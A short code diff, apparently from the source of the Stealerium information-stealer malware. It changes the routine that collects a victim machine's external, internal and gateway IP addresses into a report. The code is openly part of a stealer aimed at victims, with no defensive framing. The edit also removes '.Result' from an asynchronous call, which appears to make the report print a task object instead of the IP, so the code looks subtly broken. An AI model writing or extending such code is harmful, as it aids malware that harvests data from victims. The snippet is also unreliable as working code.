@@ -13,7 +13,7 @@ namespace Stealerium.Target.System
             {
                 var systemInfoText = ""
                                      + "\n[IP]"
-                                     + "\nExternal IP: " + SystemInfo.GetPublicIp().Result
+                                     + "\nExternal IP: " + SystemInfo.GetPublicIp()
                                      + "\nInternal IP: " + SystemInfo.GetLocalIp()
                                      + "\nGateway IP: " + SystemInfo.GetDefaultGateway()
                                      + "\n"
